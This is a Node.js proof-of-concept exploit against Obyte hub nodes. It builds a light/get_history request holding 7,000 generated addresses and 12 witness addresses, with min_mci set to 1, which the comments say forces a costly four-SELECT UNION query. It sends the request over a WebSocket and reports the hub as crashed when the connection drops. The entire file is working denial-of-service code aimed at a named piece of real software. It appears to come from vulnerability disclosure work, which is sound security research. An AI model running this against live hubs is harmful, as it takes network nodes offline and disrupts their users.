var WebSocket = require('ws');
var crypto = require('crypto');
var chash = require('./chash.js');

/// target hub node address, default testnet hub port
var TARGET = process.argv[2] || 'ws://127.0.0.1:6611';
var NUM_ADDRESSES = 7000;

/// generate valid Obyte addresses using ocore's own chash module
var addresses = [];
for (var i = 0; i < NUM_ADDRESSES; i++)
	addresses.push(chash.getChash160('poc_addr_' + i));

/// generate 12 valid witness addresses (COUNT_WITNESSES = 12)
var witnesses = [];
for (var i = 0; i < 12; i++)
	witnesses.push(chash.getChash160('poc_witness_' + i));

/// build the light/get_history request payload
/// min_mci: 1 forces the 4-SELECT UNION path in prepareHistory
var tag = crypto.randomBytes(32).toString('base64');
var payload = JSON.stringify([
	'request',
	{
		tag: tag,
		command: 'light/get_history',
		params: {
			addresses: addresses,
			witnesses: witnesses,
			min_mci: 1
		}
	}
]);

console.log('payload size: ' + (payload.length / 1024).toFixed(1) + 'KB');
console.log('address count: ' + addresses.length);
console.log('connecting to ' + TARGET);

var ws = new WebSocket(TARGET);
var crashed = false;

ws.on('open', function() {
	console.log('connected, sending payload');
	ws.send(payload);
});

/// hub crash closes the connection abruptly
ws.on('close', function(code) {
	crashed = true;
	console.log('connection closed (code ' + code + '), hub process crashed');
	process.exit(0);
});

ws.on('error', function(err) {
	if (!crashed)
		console.log('connection error: ' + err.message);
	process.exit(1);
});

/// timeout if hub somehow survives
setTimeout(function() {
	console.log('timeout, hub did not crash within 10s');
	ws.close();
	process.exit(1);
}, 10000);
